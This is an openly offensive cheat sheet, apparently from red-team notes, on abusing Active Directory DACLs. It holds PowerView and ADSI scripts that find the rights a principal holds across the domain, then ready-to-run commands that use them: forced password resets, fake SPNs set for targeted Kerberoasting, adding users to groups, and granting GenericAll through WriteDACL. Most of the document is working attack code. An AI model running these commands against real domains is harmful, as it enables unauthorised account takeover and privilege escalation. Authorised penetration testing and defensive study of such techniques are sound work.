# DACL Abuse

## Sweep interesting DACLs for a principal
```powershell
# Replace identity with a principal such as a user, computer or group.
# We are checking what interesting rights the value of $Identity has against other principals within the domain

# Check against all domain users
$Identity = "PROD\OFFSEC" ; Get-DomainUser | Get-ObjectAcl -ResolveGUIDs -ErrorAction "SilentlyContinue"  | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.Identity -eq "$Identity" -and ($_.ActiveDirectoryRights -like "*GenericAll*" -or $_.ActiveDirectoryRights -like "*GenericWrite*" -or $_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*AddAllowedToAct*" -or $_.ActiveDirectoryRights -like "*SyncLAPSPassword*" -or $_.ActiveDirectoryRights -like "*WriteAccountRestrictions*" -or $_.ActiveDirectoryRights -like "*WriteSPN*" -or $_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*WriteOwner*" -or $_.ActiveDirectoryRights -like "*AllExtendedRights*" -or $_.ActiveDirectoryRights -like "*ExtendedRight") }

# Check against all domain groups
$Identity = "PROD\OFFSEC" ; Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs -ErrorAction "SilentlyContinue"  | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.Identity -eq "$Identity" -and ($_.ActiveDirectoryRights -like "*GenericAll*" -or $_.ActiveDirectoryRights -like "*GenericWrite*" -or $_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*AddAllowedToAct*" -or $_.ActiveDirectoryRights -like "*SyncLAPSPassword*" -or $_.ActiveDirectoryRights -like "*WriteAccountRestrictions*" -or $_.ActiveDirectoryRights -like "*WriteSPN*" -or $_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*WriteOwner*" -or $_.ActiveDirectoryRights -like "*AllExtendedRights*" -or $_.ActiveDirectoryRights -like "*ExtendedRight*") }

# Check against all domain computers
$Identity = "PROD\OFFSEC" ; Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs -ErrorAction "SilentlyContinue"  | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.Identity -eq "$Identity" -and ($_.ActiveDirectoryRights -like "*GenericAll*" -or $_.ActiveDirectoryRights -like "*GenericWrite*" -or $_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*AddAllowedToAct*" -or $_.ActiveDirectoryRights -like "*SyncLAPSPassword*" -or $_.ActiveDirectoryRights -like "*WriteAccountRestrictions*" -or $_.ActiveDirectoryRights -like "*WriteSPN*" -or $_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*WriteOwner*" -or $_.ActiveDirectoryRights -like "*AllExtendedRights*" -or $_.ActiveDirectoryRights -like "*ExtendedRight*") }

# Check against all domain objects
$Identity = "PROD\OFFSEC" ; Get-DomainObject  | Get-ObjectAcl -ResolveGUIDs -ErrorAction "SilentlyContinue" | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.Identity -eq "$Identity" -and ($_.ActiveDirectoryRights -like "*GenericAll*" -or $_.ActiveDirectoryRights -like "*GenericWrite*" -or $_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*AddAllowedToAct*" -or $_.ActiveDirectoryRights -like "*SyncLAPSPassword*" -or $_.ActiveDirectoryRights -like "*WriteAccountRestrictions*" -or $_.ActiveDirectoryRights -like "*WriteSPN*" -or $_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*WriteOwner*" -or $_.ActiveDirectoryRights -like "*AllExtendedRights*" -or $_.ActiveDirectoryRights -like "*ExtendedRight*") }

# All objects, ADSI native
# Change the line below to current or targeted principal.
$Identity = "PROD\OFFSEC"
$Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$DomainDN = $Domain.GetDirectoryEntry().distinguishedName

$User = New-Object System.Security.Principal.NTAccount($Identity)
$UserSID = $User.Translate([System.Security.Principal.SecurityIdentifier])

$PermissionsToCheck = @(
    "GenericAll",
    "GenericWrite",
    "WriteProperty",
    "AddAllowedToAct",
    "SyncLAPSPassword",
    "WriteAccountRestrictions",
    "WriteSPN",
    "WriteDACL",
    "WriteOwner",
    "AllExtendedRights",
    "ExtendedRight"
)

$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainDN")
$Searcher.Filter = "(objectClass=*)"
$Searcher.PageSize = 1000
$Searcher.PropertiesToLoad.AddRange(@("distinguishedName"))
$Objects = $Searcher.FindAll()

foreach ($Object in $Objects) {
    $ObjectDN = $Object.Properties["distinguishedName"][0]
    $ObjectEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$ObjectDN")

    try {
        $ObjectEntry.RefreshCache(@("ntSecurityDescriptor"))
        $SecurityDescriptor = $ObjectEntry.ObjectSecurity
        $ACL = $SecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])

        foreach ($Ace in $ACL) {
            if ($Ace.IdentityReference -eq $UserSID) {
                foreach ($Permission in $PermissionsToCheck) {
                    if ($Ace.ActiveDirectoryRights.ToString().Contains($Permission)) {
                        [PSCustomObject]@{
                            ObjectDN              = $ObjectDN
                            Identity              = $Identity
                            ActiveDirectoryRights = $Ace.ActiveDirectoryRights
                            InheritanceType       = $Ace.InheritanceType
                            ObjectType            = $Ace.ObjectType
                            IsInherited           = $Ace.IsInherited
                        }
                        break
                    }
                }
            }
        }
    } catch {
        continue
    }
}
```

## Abuse Methods
### User Objects
#### DACLs: GenericAll, AllExtendedRights, ForceChangePassword
The simplest way is to forcefully change a users password
```powershell
# CMD
net user UserAccount Password /domain

# PowerView
$Password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
set-DomainUserPassword -Identity 'UserAccount' -AccountPassword $Password

# ADSI
([ADSI]"LDAP://CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com").SetPassword("Password123!")
```
#### DACLs: Generic All, GenericWrite
##### Targeted Kerberoasting
```powershell
# CMD
setspn -A fake/fake UserAccount

# PowerView
Set-DomainObject -Identity 'TestService3' -Set @{serviceprincipalname='fake/fake'} -Verbose

# ADSI
$user = [ADSI]"LDAP://CN=TestService3,OU=prodUsers,DC=prod,DC=corp1,DC=com"; $user.Put("servicePrincipalName", "fake/fake"); $user.SetInfo()
```
### Group Objects
#### DACLs: GenericAll, AllExtendedRights, GenericWrite, WriteProperty, Self
The simplest method of abuse it to add users to the group membership
```powershell
# CMD
net group "Group Name" UserToAdd /add /domain

# PowerView
Add-DomainGroupMember -Members "UserToAdd" -GroupName "GroupName" -Domain "Security.local" -Verbose

# ADSI
([ADSI]"LDAP://CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com").Add("LDAP://CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com")
```

## Write-DACL
Write DACL can be used to modify the entire DACL of an object. effectively granting which permissions we wish over the object. When we have access to an account with this permission over an object, the best approach is to assigned ourselves "GenericAll" then repeat any of the methods shown above.

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
Add-DomainObjectAcl -TargetIdentity Computer$ -PrincipalIdentity offsec -Rights All #Computer


# Native
$Identity = "PROD\offsec" # User to add to DACL
$TargetADObjectDN = "CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com" # Target principal to modify
$TargetUserSid = (New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(sAMAccountName=$($Identity.Split('\')[-1]))").FindOne().properties.objectsid[0], 0)).ToString()
$TargetEntry = [ADSI]"LDAP://$TargetADObjectDN"
$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
$ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$TargetUserSid)),[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,[System.Security.AccessControl.AccessControlType]::Allow,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
$ObjectSecurity.AddAccessRule($ACE)
$TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
try {$TargetEntry.PsBase.CommitChanges() ; Write-Output "`n[+] Successfully committed changes to $TargetADObjectDN for $Identity. `n"} catch { Write-Output "`n[-] Failed to commit changes. Error: $_ `n"}
```

